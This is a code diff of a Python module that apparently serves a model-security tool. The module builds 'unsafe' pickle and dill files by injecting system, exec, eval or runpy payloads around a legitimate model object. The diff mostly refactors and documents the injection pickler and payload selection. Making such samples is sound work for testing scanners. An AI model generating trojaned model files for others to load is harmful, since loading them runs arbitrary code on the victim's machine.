@@ -9,13 +9,70 @@ from __future__ import annotations
 import os
 import pickle
 import struct
-from enum import Enum
 from typing import TYPE_CHECKING, Any
 
 import dill
 
 if TYPE_CHECKING:
     from _typeshed import SupportsWrite
+
+
+class PickleInject:
+    """Pickle injection"""
+
+    def __init__(self, inj_objs: Any, first: bool = True):
+        self.__name__ = "pickle_inject"
+        self.inj_objs = inj_objs
+        self.first = first
+
+    class _Pickler(pickle._Pickler):
+        """Re-implementation of Pickler with support for injection"""
+
+        def __init__(
+            self,
+            file: SupportsWrite[bytes],
+            protocol: int | None,
+            inj_objs: Any,
+            first: bool = True,
+        ) -> None:
+            """
+            file: File object with write attribute
+            protocol: Pickle protocol - Currently the default protocol is 4: https://docs.python.org/3/library/pickle.html
+            inj_objs: _joblibInject object that has both the command, and the code to be injected
+            first: Boolean object to determine if inj_objs should be serialized before the safe file or after the safe file.
+            """
+            super().__init__(file, protocol)
+            self.inj_objs = inj_objs
+            self.first = first
+
+        def dump(self, obj: Any) -> None:
+            """Pickle data, inject object before or after"""
+            if self.proto >= 2:  # type: ignore[attr-defined]
+                self.write(pickle.PROTO + struct.pack("<B", self.proto))  # type: ignore[attr-defined]
+            if self.proto >= 4:  # type: ignore[attr-defined]
+                self.framer.start_framing()  # type: ignore[attr-defined]
+
+            # Inject the object(s) before the user-supplied data?
+            if self.first:
+                # Pickle injected objects
+                for inj_obj in self.inj_objs:
+                    self.save(inj_obj)  # type: ignore[attr-defined]
+
+            # Pickle user-supplied data
+            self.save(obj)  # type: ignore[attr-defined]
+
+            # Inject the object(s) after the user-supplied data?
+            if not self.first:
+                # Pickle injected objects
+                for inj_obj in self.inj_objs:
+                    self.save(inj_obj)  # type: ignore[attr-defined]
+
+            self.write(pickle.STOP)  # type: ignore[attr-defined]
+            self.framer.end_framing()  # type: ignore[attr-defined]
+
+    def Pickler(self, file: Any, protocol: Any) -> _Pickler:
+        # Initialise the pickler interface with the injected object
+        return self._Pickler(file, protocol, self.inj_objs)
 
 
 class _PickleInject:
@@ -69,76 +126,9 @@ class RunPyInject(_PickleInject):
         return self.command, (self.args, {})
 
 
-class PicklePayload(Enum):
-    """Enum for different Pickle Injection Payloads."""
-
-    SYSTEM = SystemInject
-    EXEC = ExecInject
-    EVAL = EvalInject
-    RUNPY = RunPyInject
-
-
-class PickleInject:
-    """Pickle injection. Pretends to be a "module" to work with torch."""
-
-    def __init__(self, inj_objs: Any, first: bool = True) -> None:
-        self.__name__ = "pickle_inject"
-        self.inj_objs = inj_objs
-        self.first = first
-
-    class _Pickler(pickle.Pickler):
-        """Re-implementation of Pickler with support for injection"""
-
-        def __init__(
-            self,
-            file: SupportsWrite[bytes],
-            protocol: None | int,
-            inj_objs: Any,
-            first: bool = True,
-        ) -> None:
-            """Initialise the pickler with injected objects.
-
-            Args:
-                file: File object with write attribute.
-                protocol: Pickle protocol - Currently the default protocol is 4: https://docs.python.org/3/library/pickle.html.
-                inj_objs: _joblibInject object that has both the command, and the code to be injected.
-                first: Boolean object to determine if inj_objs should be serialized before the safe file or after the safe file.
-            """
-            super().__init__(file, protocol)
-            self.inj_objs = inj_objs
-            self.first = first
-
-        def dump(self, obj: Any) -> None:
-            """Pickle data, inject object before or after."""
-            if self.proto >= 2:
-                self.write(pickle.PROTO + struct.pack("<B", self.proto))
-            if self.proto >= 4:
-                self.framer.start_framing()
-
-            # Inject the object(s) before the user-supplied data?
-            if self.first:
-                # Pickle injected objects
-                for inj_obj in self.inj_objs:
-                    self.save(inj_obj)
-
-            # Pickle user-supplied data
-            self.save(obj)
-
-            # Inject the object(s) after the user-supplied data?
-            if not self.first:
-                # Pickle injected objects
-                for inj_obj in self.inj_objs:
-                    self.save(inj_obj)
-
-            self.write(pickle.STOP)
-            self.framer.end_framing()
-
-    def Pickler(self, file, protocol):  # pylint: disable=protected-access
-        """Initialise the pickler interface with the injected object."""
-        return self._Pickler(file, protocol, self.inj_objs)
-
-
-def get_inject_payload(command: str, malicious_code: str) -> _PickleInject:
+def get_inject_payload(
+    command: str, malicious_code: str
+) -> SystemInject | ExecInject | EvalInject | RunPyInject:
     """Get the payload for the pickle injection.
 
     Args:
@@ -146,22 +136,33 @@ def get_inject_payload(command: str, malicious_code: str) -> _PickleInject:
         malicious_code: The code to be injected.
 
     Returns:
-        _PickleInject: The payload for the pickle injection.
+        PickleInject object.
+
+    Raises:
+        ValueError: If the command is not supported.
     """
-    pickle_inject = PicklePayload[command.upper()].value
-    return pickle_inject(malicious_code)
+    if command == "system":
+        return SystemInject(malicious_code)
+    if command == "exec":
+        return ExecInject(malicious_code)
+    if command == "eval":
+        return EvalInject(malicious_code)
+    if command == "runpy":
+        return RunPyInject(malicious_code)
+    else:
+        raise ValueError(f"Invalid command: {command}")
 
 
 def generate_unsafe_pickle_file(
-    safe_model, command: str, malicious_code: str, unsafe_model_path: str
+    safe_model: Any, command: str, malicious_code: str, unsafe_model_path: str
 ) -> None:
     """Create an unsafe pickled file with injected code.
 
     Args:
-        safe_model: _description_
-        command: _description_
-        malicious_code: _description_
-        unsafe_model_path: _description_
+        safe_model: Safe model to be pickled.
+        command: The command to be injected.
+        malicious_code: The malicious to be injected.
+        unsafe_model_path: Path to save the unsafe model.
     """
     payload = get_inject_payload(command, malicious_code)
     pickle_protocol = 4
@@ -180,8 +181,8 @@ class DillInject:
         self.inj_objs = inj_objs
         self.first = first
 
-    class _Pickler(dill.Pickler):
-        """Re-implementation of Pickler with support for injection"""
+    class _Pickler(dill._dill.Pickler):  # type: ignore[misc]
+        """Reimplementation of Pickler with support for injection"""
 
         def __init__(
             self,
@@ -189,7 +190,7 @@ class DillInject:
             protocol: int | None,
             inj_objs: Any,
             first: bool = True,
-        ) -> None:
+        ):
             super().__init__(file, protocol)
             self.inj_objs = inj_objs
             self.first = first
@@ -219,7 +220,7 @@ class DillInject:
             self.write(pickle.STOP)
             self.framer.end_framing()
 
-    def DillPickler(self, file: Any, protocol: None | int) -> _Pickler:
+    def DillPickler(self, file: Any, protocol: Any) -> _Pickler:
         # Initialise the pickler interface with the injected object
         return self._Pickler(file, protocol, self.inj_objs)
 
